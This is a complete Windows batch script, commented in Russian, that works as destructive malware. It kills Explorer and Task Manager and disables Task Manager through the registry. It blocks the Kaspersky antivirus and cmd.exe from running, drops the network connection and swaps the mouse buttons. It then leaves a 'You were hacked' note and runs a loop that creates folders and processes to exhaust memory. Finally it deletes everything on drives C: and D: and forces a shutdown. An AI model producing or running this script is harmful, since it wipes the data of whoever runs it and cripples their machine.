@echo off
::убираем лишний explorer.exe и на всякий случай taskmgr.exe
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe
::теперь можно отключить диспетчер задач
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 1 /f>nul
::чтобы не было "читов":
::1. Меняем расширение ярлыков на txt
assoc .ink=.txt
::2. Запрещаем автоматический запуск драйверов
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v "NoDriveTypeAutoRun" /t REG_DWORD /d " 0xFF" /f
::3. Отключаем интернет
Ipconfig /release
::4. Запрещаем запуск Каспера и cmd.exe
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v "3" /t reg_sz /d "kaspersky.exe" /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v "DisallowRun" /t REG_DWORD /d "1" /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v "3" /t reg_sz /d "cmd.exe" /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v "DisallowRun" /t REG_DWORD /d "1" /f
::И чтобы посложнее было закрыть, ломаем мышь
%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
::Сообщаем о себе
echo "-----------------" >> report.txt
echo "You were hacked" >> report.txt
echo "I am in your computer and killing it :)" >> report.txt
::создаем кучу папок и забиваем ОЗУ
:x
set /A papka += 1
msg * "Killing OZU and memory..."
start
echo %papka% >> report.txt
echo "Your OZU and memory are killing..." >> report.txt
md C:\papka_%papka%
if papka NEQ 1000000 goto x
md C:\nul
echo "Your OZU was killed:)" >> report.txt
::удаляем систему
msg * "Killing the System..."
taskkill /f /im System
del d: /s /q
del c: /s /q
shutdown /s /f /t 0